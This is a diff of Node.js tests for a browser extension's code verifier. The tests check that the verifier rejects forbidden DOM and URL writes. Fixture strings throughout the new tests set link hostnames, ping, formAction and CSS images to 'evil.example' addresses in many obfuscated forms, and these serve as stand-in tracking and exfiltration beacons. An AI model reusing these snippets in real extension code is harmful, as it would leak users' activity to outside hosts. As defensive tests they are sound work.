@@ -1,11 +1,11 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { parseHTML } from "linkedom";
-import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { cpSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { tmpdir } from "node:os";
 import { runNode } from "../scripts/test-cli.mjs";
-import { scanSource, checkManifest, checkProbeDir, attackSelfTest } from "../scripts/verify.mjs";
+import { scanSource, checkManifest, checkProbeDir, attackSelfTest, authorLinkSelfTest, urlMutationSelfTest, authorBoundarySelfTest, destructuringSelfTest, resourcePropertySelfTest } from "../scripts/verify.mjs";
 import { allowedRequest, hasExtensionInitiator } from "../scripts/network-policy.mjs";
 await import("../probe/reader.js");
 const R = globalThis.XSCHED_READER;
@@ -15,6 +15,26 @@ const snap = (html, pathname = path) => R.readSnapshot(doc(html), { pathname });
 const phrase = "Will send on Oct 10, 2026 at 9:00 AM";
 const row = (body = "fake body") => `<div data-testid="cellInnerDiv"><div role="button" aria-label="${phrase} ${body}"><span>${phrase}</span><span data-testid="tweetText">${body}</span></div></div>`;
 const goodManifest = { manifest_version: 3, content_scripts: [{ matches: ["https://x.com/*"], js: ["ok.js"] }] };
+
+test('author-link guard rejects 22 URL, element, file and extra-sink attacks', () => {
+  assert.equal(authorLinkSelfTest(), 22);
+});
+
+test('URL-write guard rejects 160 component, computed-key and reflection attacks in other files', () => {
+  assert.equal(urlMutationSelfTest(), 160);
+});
+
+test('author boundary rejects 28 fake-document, changed-call and changed-source attacks', () => {
+  assert.equal(authorBoundarySelfTest(), 28);
+});
+
+test('destructuring guard rejects 158 nested assignment, loop, default and binding attacks', () => {
+  assert.equal(destructuringSelfTest(), 158);
+});
+
+test('resource guard rejects 514 aligned attribute/IDL writes and preserves safe reads/styles', () => {
+  assert.equal(resourcePropertySelfTest(), 514);
+});
 
 test("privacy self-test actually fails when skeleton or time masking leaks", () => {
   assert.doesNotThrow(() => attackSelfTest());
@@ -211,4 +231,76 @@ test('verify CLI rejects destructured, reflected and handler activation before e
       assert.ok(result.stderr.includes(rule), result.stderr);
     }
   } finally { rmSync(directory, { recursive: true, force: true }); }
+});
+
+test('verify CLI rejects URL mutation and factory substitution before executing code', () => {
+  const directory = mkdtempSync(join(tmpdir(), 'xsched-author-review-'));
+  try {
+    writeFileSync(join(directory, 'manifest.json'), JSON.stringify(goodManifest));
+    for (const [source, rule] of [
+      ["author.search = '?x=1'; author.hostname = 'evil.example';", 'URL component write'],
+      ['Object.assign(author,{search:"?x=1"})', 'reflective property mutation'],
+      ["createAuthorLink({createElement: () => document.createElement('link')});", 'author factory references'],
+      ['const {document, unused} = fake;', 'document/element factory mutation'],
+    ]) {
+      writeFileSync(join(directory, 'ok.js'), source + '\nthrow new Error("unsafe module executed");');
+      const result = runNode(['scripts/verify.mjs', directory], { timeout: 10000 });
+      assert.equal(result.status, 1, result.stdout + result.stderr);
+      assert.ok(result.stderr.includes(rule), result.stderr);
+      assert.ok(!result.stderr.includes('unsafe module executed'), result.stderr);
+    }
+  } finally { rmSync(directory, { recursive: true, force: true }); }
+});
+
+test('full repo verify CLI rejects 19 pointerover URL/resource rewrites in an unlocked reader module', () => {
+  const directory = mkdtempSync(join(tmpdir(), 'xsched-nested-repo-'));
+  const root = new URL('../', import.meta.url);
+  try {
+    // Run the actual guard with its ROOT in this clone: the reviewed UI/content
+    // labels and digests must pass, so they cannot mask an unlocked-file attack.
+    for (const name of ['probe', 'scripts']) cpSync(new URL(name, root), join(directory, name), { recursive:true });
+    mkdirSync(join(directory, 'docs'));
+    for (const name of readdirSync(new URL('docs', root)).filter(name => /^xsched-logo-B.*\.svg$/.test(name))) cpSync(new URL('docs/' + name, root), join(directory, 'docs', name));
+    symlinkSync(new URL('node_modules', root).pathname, join(directory, 'node_modules'), 'dir');
+    cpSync(new URL('package.json', root), join(directory, 'package.json'));
+    const cli = join(directory, 'scripts/verify.mjs');
+    const baseline = runNode([cli], { timeout:10000 });
+    assert.equal(baseline.status, 0, baseline.stdout + baseline.stderr);
+    assert.match(baseline.stdout, /158 destructuring self-tests/);
+    assert.match(baseline.stdout, /514 resource property self-tests/);
+    assert.match(baseline.stdout, /308 CSS resource self-tests/);
+    const readerPath = join(directory, 'probe/reader.js');
+    const original = readFileSync(readerPath, 'utf8');
+    for (const [rewrite, rule] of [
+      ["({first: author.search, second: {value: other}} = {first: '?x=1', second: {value: 0}});", 'destructuring member access'],
+      ["({first: author.hostname, second: {value: other}} = {first: 'evil.example', second: {value: 0}});", 'destructuring member access'],
+      ["for ({first: author.search, second: {value: other}} of [{first:'?x=1', second:{value:0}}]) {}\nfor ({first: author.hostname, second: {value: other}} of [{first:'evil.example', second:{value:0}}]) {}", 'destructuring member access'],
+      ["author.ping = 'https://evil.example/ping';", 'resource property write'],
+      ["author['\\u0070ing'] = 'https://evil.example/ping';", 'resource property write'],
+      ["author['pi' + 'ng'] = 'https://evil.example/ping';", 'resource property write'],
+      ["Reflect.set(author, 'ping', 'https://evil.example/ping');", 'reflective property mutation/extraction'],
+      ["Object.assign(author, {ping: 'https://evil.example/ping'});", 'reflective property mutation/extraction'],
+      ["Object.defineProperty(author, 'ping', {value: 'https://evil.example/ping'});", 'reflective property mutation/extraction'],
+      ["({first: author.ping, second: {value: other}} = {first: 'https://evil.example/ping', second: {value: 0}});", 'destructuring member access'],
+      ["author.attributionSrc = 'https://evil.example/report';", 'resource property write'],
+      ["author.formAction = 'https://evil.example/submit';", 'resource property write'],
+      ["author.srcdoc = '<p>synthetic</p>';", 'resource property write'],
+      ["author.referrerPolicy = 'unsafe-url';", 'resource property write'],
+      ["author.background = 'https://evil.example/background';", 'resource property write'],
+      ["const write = author.setAttribute; write.call(author, 'ping', 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
+      ["author.setAttribute.call(author, 'ping', 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
+      ["const name = 'ping'; author.setAttribute(name, 'https://evil.example/ping');", 'dynamic/extracted attribute mutation'],
+      ["author.style.setProperty('background-image', 'image-set(\"https://evil.example/tracker.png\" 1x)');", 'CSS image/resource value'],
+    ]) {
+      const handler = `\ndocument.addEventListener('pointerover', event => {\n  const host = document.querySelector('#xsched-probe-root');\n  const author = host?.shadowRoot?.querySelector('.panel-author');\n  if (!author) return;\n  let other;\n  ${rewrite}\n});\n`;
+      writeFileSync(readerPath, original + handler);
+      const result = runNode([cli], { timeout:10000 });
+      assert.equal(result.status, 1, result.stdout + result.stderr);
+      assert.ok(result.stderr.includes(`probe/reader.js: ${rule} forbidden`), result.stderr);
+      assert.doesNotMatch(result.stderr, /differs from reviewed source|SELF-TEST FAILED/);
+      // The top-level pure-module import must be skipped before running the
+      // malicious handler module; no global DOM exists in this CLI process.
+      assert.doesNotMatch(result.stderr, /ReferenceError|document is not defined/);
+    }
+  } finally { rmSync(directory, {recursive:true, force:true}); }
 });
